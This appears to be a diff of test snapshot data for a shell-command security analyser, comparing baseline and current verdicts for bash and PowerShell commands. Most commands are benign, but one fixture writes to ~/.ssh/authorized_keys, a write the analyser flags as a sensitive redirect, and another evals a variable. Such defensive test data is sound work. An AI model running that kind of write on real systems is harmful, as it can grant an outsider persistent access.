+          "persistable": false,
+          "hasMetasyntax": true
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-16-array-subexpression",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "$v = @(Get-ChildItem).Count"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "$v",
+                "args": [
+                  "=",
+                  "@(Get-ChildItem).Count"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "segment:0:shell-control-flow"
+            ]
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "$v = @(Get-ChildItem).Count"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [],
+            "connectors": [],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "assignment_expression:$v = @(Get-ChildItem).Count"
+            ]
+          }
+        }
+      },
+      "facts": {
+        "baseline": {
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "$v",
+              "args": [
+                "=",
+                "@(Get-ChildItem).Count"
+              ],
+              "segmentIndex": 0
+            }
+          ],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "segment:0:shell-control-flow"
+          ]
+        },
+        "current": {
+          "dialect": "windows-powershell",
+          "operations": [],
+          "connectors": [],
+          "paths": [],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "assignment_expression:$v = @(Get-ChildItem).Count"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "t2-17-param-block",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "param([string]$Name)\nWrite-Output $Name"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "param([string]$Name)",
+                "args": [],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "$Name"
                 ],
                 "segmentIndex": 1
               }
             ],
             "connectors": [
-              "&&"
+              ";"
             ],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "segment:0:unparseable"
+              "segment:0:shell-control-flow"
             ]
           }
         },
         "current": {
-          "verdict": "deny",
-          "denyReason": "命令语法解析失败，无法进行安全分析",
-          "segments": [],
+          "verdict": "ask",
+          "segments": [
+            "param([string]$Name)\nWrite-Output $Name"
+          ],
           "pathVerdict": {
             "decision": "ask",
-            "violations": [
-              {
-                "code": "PARSE_ERROR",
-                "message": "命令语法解析失败，无法进行安全分析",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "命令语法解析失败，无法进行安全分析"
-            ],
-            "outsideWorkDirRisk": true,
-            "requiresRiskAck": true
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
           },
+          "permissionDecision": "ask",
           "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": true,
-            "warnings": [
-              "命令语法解析失败，无法进行安全分析"
-            ]
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
-            "operations": [],
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "Write-Output",
+                "args": [
+                  "$Name"
+                ],
+                "segmentIndex": 0
+              }
+            ],
             "connectors": [],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "parse:tree-error"
+              "param_block:param([string]$Name)"
             ]
           }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "param([string]$Name)",
+              "args": [],
+              "segmentIndex": 0
+            },
+            {
+              "verb": "Write-Output",
               "args": [
-                "start"
+                "$Name"
               ],
               "segmentIndex": 1
             }
           ],
           "connectors": [
-            "&&"
+            ";"
           ],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "segment:0:unparseable"
+            "segment:0:shell-control-flow"
           ]
         },
         "current": {
-          "dialect": "posix-bash",
-          "operations": [],
+          "dialect": "windows-powershell",
+          "operations": [
+            {
+              "verb": "Write-Output",
+              "args": [
+                "$Name"
+              ],
+              "segmentIndex": 0
+            }
+          ],
           "connectors": [],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "parse:tree-error"
+            "param_block:param([string]$Name)"
           ]
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": false,
-          "auditReason": "命令语法解析失败，无法进行安全分析"
         }
       }
     }
   },
   {
-    "id": "b39-truncated-subst",
-    "dialect": "posix-bash",
+    "id": "t2-19-method-chaining",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo $("
+            "$sb = [System.Text.StringBuilder]::new()",
+            "$sb.Append(\"x\")"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -3427,120 +4605,127 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "$sb",
                 "args": [
-                  "$("
+                  "=",
+                  "[System.Text.StringBuilder]::new()"
                 ],
                 "segmentIndex": 0
+              },
+              {
+                "verb": "$sb.Append(x)",
+                "args": [],
+                "segmentIndex": 1
               }
             ],
-            "connectors": [],
+            "connectors": [
+              ";"
+            ],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "segment:0:shell-control-flow"
+              "segment:0:shell-control-flow",
+              "segment:1:shell-control-flow"
             ]
           }
         },
         "current": {
-          "verdict": "deny",
-          "denyReason": "命令语法解析失败，无法进行安全分析",
-          "segments": [],
+          "verdict": "ask",
+          "segments": [
+            "$sb = [System.Text.StringBuilder]::new()",
+            "$sb.Append(\"x\")"
+          ],
           "pathVerdict": {
             "decision": "ask",
-            "violations": [
-              {
-                "code": "PARSE_ERROR",
-                "message": "命令语法解析失败，无法进行安全分析",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "命令语法解析失败，无法进行安全分析"
-            ],
-            "outsideWorkDirRisk": true,
-            "requiresRiskAck": true
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
           },
+          "permissionDecision": "ask",
           "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": true,
-            "warnings": [
-              "命令语法解析失败，无法进行安全分析"
-            ]
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [],
-            "connectors": [],
+            "connectors": [
+              ";",
+              ";"
+            ],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "parse:tree-error"
+              "assignment_expression:$sb = [System.Text.StringBuilder]::new()",
+              "logical_expression:$sb.Append(\"x\")"
             ]
           }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "$sb",
               "args": [
-                "$("
+                "=",
+                "[System.Text.StringBuilder]::new()"
               ],
               "segmentIndex": 0
+            },
+            {
+              "verb": "$sb.Append(x)",
+              "args": [],
+              "segmentIndex": 1
             }
           ],
-          "connectors": [],
+          "connectors": [
+            ";"
+          ],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "segment:0:shell-control-flow"
+            "segment:0:shell-control-flow",
+            "segment:1:shell-control-flow"
           ]
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [],
-          "connectors": [],
+          "connectors": [
+            ";",
+            ";"
+          ],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "parse:tree-error"
+            "assignment_expression:$sb = [System.Text.StringBuilder]::new()",
+            "logical_expression:$sb.Append(\"x\")"
           ]
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": false,
-          "auditReason": "命令语法解析失败，无法进行安全分析"
         }
       }
     }
   },
   {
-    "id": "b40-bare-paren-echo",
-    "dialect": "posix-bash",
+    "id": "t2-20-using-namespace",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo \"a(b)\""
+            "using namespace System.IO\n[File]::Exists(\"a\")"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -3557,29 +4742,37 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "using",
                 "args": [
-                  "a(b)"
+                  "namespace",
+                  "System.IO"
                 ],
                 "segmentIndex": 0
+              },
+              {
+                "verb": "[File]::Exists(a)",
+                "args": [],
+                "segmentIndex": 1
               }
             ],
-            "connectors": [],
+            "connectors": [
+              ";"
+            ],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "segment:0:shell-control-flow"
+              "segment:1:shell-control-flow"
             ]
           }
         },
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo \"a(b)\""
+            "using namespace System.IO\n[File]::Exists(\"a\")"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -3596,632 +4789,78 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "using",
                 "args": [
-                  "\"a(b)\""
+                  "namespace",
+                  "System.IO"
                 ],
                 "segmentIndex": 0
               }
             ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "a(b)"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "\"a(b)\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": true,
-          "hasMetasyntax": false
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": true,
-          "hasMetasyntax": false
-        }
-      }
-    }
-  },
-  {
-    "id": "b41-bare-paren-grep",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "grep \"foo(bar)\" x.txt"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "grep",
-                "args": [
-                  "foo(bar)",
-                  "x.txt"
-                ],
-                "segmentIndex": 0
-              }
+            "connectors": [
+              ";"
             ],
-            "connectors": [],
             "paths": [],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
             "unresolved": [
-              "segment:0:shell-control-flow"
+              "logical_expression:[File]::Exists(\"a\")"
             ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "grep \"foo(bar)\" x.txt"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "grep",
-                "args": [
-                  "\"foo(bar)\"",
-                  "x.txt"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
           }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "grep",
+              "verb": "using",
               "args": [
-                "foo(bar)",
-                "x.txt"
+                "namespace",
+                "System.IO"
               ],
               "segmentIndex": 0
+            },
+            {
+              "verb": "[File]::Exists(a)",
+              "args": [],
+              "segmentIndex": 1
             }
           ],
-          "connectors": [],
+          "connectors": [
+            ";"
+          ],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "segment:0:shell-control-flow"
+            "segment:1:shell-control-flow"
           ]
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "grep",
+              "verb": "using",
               "args": [
-                "\"foo(bar)\"",
-                "x.txt"
+                "namespace",
+                "System.IO"
               ],
               "segmentIndex": 0
             }
           ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": true,
-          "hasMetasyntax": false
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": true,
-          "hasMetasyntax": false
-        }
-      }
-    }
-  },
-  {
-    "id": "b42-bare-paren-text",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo \"text (with parens) here\""
+          "connectors": [
+            ";"
           ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "text (with parens) here"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo \"text (with parens) here\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "\"text (with parens) here\""
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "text (with parens) here"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
           "paths": [],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
           "unresolved": [
-            "segment:0:shell-control-flow"
+            "logical_expression:[File]::Exists(\"a\")"
           ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "\"text (with parens) here\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": true,
-          "hasMetasyntax": false
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": true,
-          "hasMetasyntax": false
-        }
-      }
-    }
-  },
-  {
-    "id": "b43-redirect-sensitive",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo secret > ~/.ssh/authorized_keys"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "secret",
-                  ">",
-                  "~/.ssh/authorized_keys"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [
-              "~/.ssh/authorized_keys"
-            ],
-            "cwdChanges": [],
-            "analysisCompleteness": "partial",
-            "unresolved": [
-              "segment:0:shell-control-flow"
-            ]
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "validatorId": "redirect-sensitive-target",
-          "denyType": "weak",
-          "segments": [
-            "echo secret > ~/.ssh/authorized_keys"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": [],
-            "violationCodes": [
-              "redirect-sensitive-target"
-            ],
-            "validatorId": "redirect-sensitive-target",
-            "denyType": "weak",
-            "securityWarning": "重定向目标为敏感路径（~/.ssh/authorized_keys），需人工确认"
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "secret"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [
-              "~/.ssh/authorized_keys"
-            ],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "secret",
-                ">",
-                "~/.ssh/authorized_keys"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [
-            "~/.ssh/authorized_keys"
-          ],
-          "cwdChanges": [],
-          "analysisCompleteness": "partial",
-          "unresolved": [
-            "segment:0:shell-control-flow"
-          ]
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "secret"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [
-            "~/.ssh/authorized_keys"
-          ],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      },
-      "precheck": {
-        "baseline": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "partial",
-          "persistable": false,
-          "hasMetasyntax": true
-        },
-        "current": {
-          "ok": true,
-          "legacyAutoAllowEligible": false,
-          "analysisCompleteness": "complete",
-          "persistable": false,
-          "hasMetasyntax": true
-        }
-      }
-    }
-  },
-  {
-    "id": "b46-eval-var",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "eval \"$CMD\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "eval",
-                "args": [
-                  "$CMD"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "eval \"$CMD\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "eval",
-                "args": [
-                  "\"$CMD\""
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "eval",
-              "args": [
-                "$CMD"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "eval",
-              "args": [
-                "\"$CMD\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
         }
       }
     }
